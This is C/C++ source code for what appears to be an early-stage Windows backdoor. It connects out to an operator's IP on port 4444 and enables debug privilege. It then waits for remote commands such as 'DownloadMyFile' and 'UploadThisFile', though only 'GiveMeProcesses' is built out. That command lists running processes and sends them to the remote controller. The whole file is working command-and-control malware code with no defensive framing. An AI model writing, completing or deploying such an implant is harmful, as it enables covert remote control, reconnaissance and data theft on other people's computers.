#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <psapi.h>
#include <vector>
#include <stack>
#include <queue>
#include <stdlib.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#define DEFAULT_BUFLEN 1024
#define DEFAULT_PORT "4444"
#define MAX_PROCS 1024

typedef std::vector<int> vi;
typedef std::pair<int, int> pii;
typedef std::vector<pii> vii;

char *commands[5] = {"GiveMeProcesses", "DownloadMyFile", "UploadThisFile", "GiveMeInfo", "Yeet"};
char recvbuf[DEFAULT_BUFLEN];
SOCKET ourSock;

int WeSendData(char *data, SOCKET sock) {
	int iResult = send(sock, data, (int)strlen(data), 0);
	if (iResult == SOCKET_ERROR) {
		printf("send failed with error: %x\n", WSAGetLastError());
		closesocket(sock);
		WSACleanup();
		return 1;
	}
	return iResult;
}

void WeRecvData(char *data, SOCKET sock) {
	int iResult;
	do {
		memset(data, 0, DEFAULT_BUFLEN);
		iResult = recv(sock, data, DEFAULT_BUFLEN - 1, 0);
		if (iResult > 0) {
			printf("We got: %s\n", data);
			break;
		}
		else if (iResult == 0)
			printf("Connection closed\n");
		else
			printf("recv failed with error: %x\n", WSAGetLastError());
	} while (iResult > 0);
}

int WeInitSocket(char *ipaddr, SOCKET *sock) {
	WSADATA wsaData;
	struct addrinfo *result = NULL, hints;

	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with error: %x\n", iResult);
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	iResult = getaddrinfo(ipaddr, DEFAULT_PORT, &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed with error: %x\n", iResult);
		WSACleanup();
		return 1;
	}

	SOCKET ConnectSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	if (ConnectSocket == INVALID_SOCKET) {
		printf("socket failed with error: %x\n", WSAGetLastError());
		WSACleanup();
		return 1;
	}

	iResult = connect(ConnectSocket, result->ai_addr, (int)result->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		closesocket(ConnectSocket);
		ConnectSocket = INVALID_SOCKET;
	}

	if (ConnectSocket == INVALID_SOCKET) {
		printf("Unable to connect to server!\n");
		WSACleanup();
		return 1;
	}

	freeaddrinfo(result);
	*sock = ConnectSocket;
	return 0;
}

int WeShutdownSocket(SOCKET sock) {
	closesocket(sock);
	WSACleanup();
}

void WeGetOneProcess(DWORD processID) {
	char szProcessName[MAX_PATH] = "<unknown>";
	char data[DEFAULT_BUFLEN];
	
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);
	memset(data, 0, sizeof(data));

	if (NULL != hProcess) {
		HMODULE hMod;
		DWORD cbNeeded;

		if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
			if (!GetModuleBaseNameA(hProcess, hMod, szProcessName, sizeof(szProcessName) / sizeof(char))) {
				printf("GetModuleBaseName failed: %x\n", GetLastError());
			}
		}
		else {
			printf("EnumProcessModules failed: %x\n", GetLastError());
		}
	}
	else {
		printf("OpenProcess failed: %x\n", GetLastError());
	}
	
	sprintf(data, "%s  (PID: %u)\n", szProcessName, processID);
	WeSendData(data, ourSock);

	CloseHandle(hProcess);
}

void WeGetPriv() {
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES tokenPriv;
	LUID luidDebug;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_READ, &hToken)) {
		if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luidDebug)) {
			tokenPriv.PrivilegeCount = 1;
			tokenPriv.Privileges[0].Luid = luidDebug;
			tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
			if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, 0, NULL, NULL)) {
				printf("AdjustTokenPrivileges failed: %x\n", GetLastError());
			}
		}
	}
}

int WeGetProcesses(void) {
	DWORD aProcesses[MAX_PROCS], cbNeeded, cProcesses;

	if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) {
		printf("EnumProcesses failed: %x\n", GetLastError());
		return 1;
	}

	cProcesses = cbNeeded / sizeof(DWORD);

	for (unsigned int i = 0; i < cProcesses; i++) {
		if (aProcesses[i] != 0) {
			WeGetOneProcess(aProcesses[i]);
		}
	}

	return 0;
}

int main(int argc, char **argv) {

	WeInitSocket(argv[1], &ourSock);
	WeGetPriv();

	while (true) {
		WeRecvData(recvbuf, ourSock);
		if (!strncmp(recvbuf, commands[0], strlen(commands[0]))) {
			WeGetProcesses();
		} else {
			printf("yeet!");
		}
		Sleep(5000);
	}
}